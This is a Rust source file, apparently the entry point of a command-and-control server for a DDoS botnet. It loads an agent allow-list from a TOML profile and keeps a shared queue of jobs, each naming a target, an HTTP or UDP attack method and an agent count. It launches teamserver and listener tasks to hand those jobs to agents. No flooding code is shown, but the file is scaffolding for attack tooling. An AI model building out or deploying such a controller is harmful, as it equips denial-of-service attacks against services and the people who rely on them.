mod listener;
mod teamserver;

use std::{fs, io::Read, ops::Deref, sync::Arc};

use toml;

use serde::{Serialize, Deserialize};
use serde_json::Value;

use tokio::sync::Mutex;

const TEAMSERVER_ADDR: &str = "127.0.0.1:5555";
const LISTENER_ADDR: &str = "127.0.0.1:8000";

#[derive(Deserialize)]
struct ProfileConfig {
    agents: ProfileAgents,
    users: Value 
}

#[derive(Deserialize)]
struct ProfileAgents {
    allowed: Vec<String>
}

#[derive(Serialize)]
enum AttackMethod { 
    HTTP,
    UDP
}

#[derive(Serialize)]
struct Job {
    target: String,
    method: AttackMethod,
    agents: isize,
}

// TODO: add commands like: list etc.

#[tokio::main]
async fn main() -> Result<(), std::io::Error> {
    let mut config_string = String::new();

    // Config parsing

    let mut file_config = fs::File::open("config/profile.toml").unwrap();
    file_config.read_to_string(&mut config_string).unwrap();
    let config_parsed = toml::from_str(&config_string).unwrap();
    let config_parsed_arc: Arc<ProfileConfig> = Arc::new(config_parsed);

    // Spawning tasks

    let jobs: Arc<Mutex<Vec<Job>>> = Arc::new(Mutex::new(Vec::new()));

    let jobs_clone = Arc::clone(&jobs);
    let config_parsed_arc_clone = Arc::clone(&config_parsed_arc);

    let teamserver_task = tokio::task::spawn( async { teamserver::run(TEAMSERVER_ADDR, config_parsed_arc, jobs_clone).await } );
    let listener_task = tokio::task::spawn( async { listener::run(LISTENER_ADDR, config_parsed_arc_clone, jobs).await } );

    // Joining tasks

    teamserver_task.await.unwrap();
    listener_task.await.unwrap();

    Ok(())
}
